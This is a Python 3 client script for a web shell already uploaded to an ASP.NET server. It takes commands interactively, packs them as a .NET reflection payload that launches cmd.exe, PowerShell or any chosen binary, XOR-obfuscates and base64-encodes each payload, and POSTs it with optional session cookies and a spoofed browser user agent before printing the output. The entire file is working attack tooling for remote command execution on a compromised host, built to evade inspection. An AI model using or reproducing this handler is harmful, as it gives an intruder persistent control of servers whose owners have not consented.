#!/usr/bin/python3
# Python3 Custom ASPX Shell Handler
import argparse
import requests
import base64
import random, string
import re

parser = argparse.ArgumentParser(description='Description of your program')
parser.add_argument('-u','--url', help='URL to Uploaded ASPX WebShell', required=True)
parser.add_argument('-c','--cookies', help='Cookies for authenticated session', type=str, default='', required=False)
args = parser.parse_args()

letters = string.ascii_letters + string.digits + string.punctuation

def xor(input_string, key):
        repeated_key = (key * (len(input_string) // len(key) + 1))[:len(input_string)]
        encrypted = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(input_string, repeated_key))
        return (bytearray(repeated_key,'UTF-8'), bytearray(encrypted,'UTF-8'))

def random_key():
        return ''.join(random.choice(letters) for i in range(33))

pattern = re.compile(r'(.*?)<html>', re.DOTALL)

program = { 'CMD':'C:\\Windows\\System32\\cmd.exe','PWSH':'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' }

exe = 'CMD'

headerdict = {}

if len(args.cookies) > 1:
        headerdict = {'Cookies': args.cookies , 'User-Agent': 'Mozilla/5.0 (x86_64; rv:145.0) Gecko/20100101 Firefox/145.0'}
else:
        headerdict = {'User-Agent': 'Mozilla/5.0 (x86_64; rv:145.0) Gecko/20100101 Firefox/145.0'}
        
while True:
        binary = exe
        command = input(f"{binary}> ")
        command_chk = command.lower()

        if command_chk in ['help','?','--help']:
                print('To Change Program Type: CMD | PWSH | CUSTOM C:\Full\Path\To\Binary.exe')
                continue
        if 'custom' in command_chk[0:9]:
                new_binary = ''.join(command_chk.split(' ')[1:])
                new_bin = new_binary.split('\\')[-1]
                program[new_bin] = new_binary
                exe = new_bin
                continue
        if command_chk == 'pwsh':
                exe = 'PWSH'
                continue
        elif command_chk == 'cmd':
                exe = 'CMD'
                continue

        payload = r'''System~System.Diagnostics.Process~System.Diagnostics.ProcessStartInfo~FileName~%s~Arguments~%s %s~UseShellExecute~RedirectStandardOutput~StartInfo~Start~StandardOutput''' \
                % (program[exe],'/c' if exe.lower() in ['cmd','cmd.exe'] else '',command)
        payload = payload
        key = random_key()
        key, payload = xor(payload,key)
        payload = base64.b64encode(payload).decode('UTF-8')
        key = base64.b64encode(key).decode('UTF-8')
        #print(payload,':',key)
        req = requests.post(args.url, data={"instance":payload,"programme":key}, headers=headerdict)
        match = pattern.search(req.text)
        print('\n' + match[0][5:][:-14] + '\n')
